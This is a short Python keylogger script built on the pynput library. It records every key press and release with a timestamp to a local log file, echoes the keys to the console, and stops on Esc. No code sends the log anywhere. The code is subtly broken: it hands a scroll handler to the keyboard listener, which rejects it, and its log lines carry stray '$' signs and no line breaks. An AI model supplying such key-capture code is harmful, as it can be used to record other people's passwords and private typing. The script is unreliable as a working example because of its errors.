from pynput.keyboard import Key, Listener
from time import *



def keylogpressed(key):

    pressed = str(key)
    try:
        pressed = key.char
        print(f'Key pressed {pressed}')

    except AttributeError:
        pressed = 'special key {0} pressed'.format(key)
        print(pressed)


    print(f'You entered {pressed}')

    
    with open("log.txt", "a") as f:
        current_time = time()
        f.write(f"Key pressed at ${current_time}     ${pressed}")

    if key == Key.esc:
        # Stop listener
        return False

def keylogreleased(key):

    released = '{0} released'.format(key)
    


    print(f'You released {released}')

    
    with open("log.txt", "a") as f:
        current_time = time()
        f.write(f"Key released at ${current_time}     ${released}")

    if key == Key.esc:
        # Stop listener
        return False

def keylogscrolled(x, y, dx, dy):
    scrolled = ""

    with open("log.txt", "a") as f:
        current_time = time()

        if dy  < 0:
            scrolled = "Down"

        else:
            scrolled = "Up"

        f.write(f"Scrolled ${scrolled} at ${current_time}")



# Collect all event until released
with Listener(on_press = keylogpressed, on_release=keylogreleased,on_scroll=keylogscrolled) as listener:   
    listener.join()
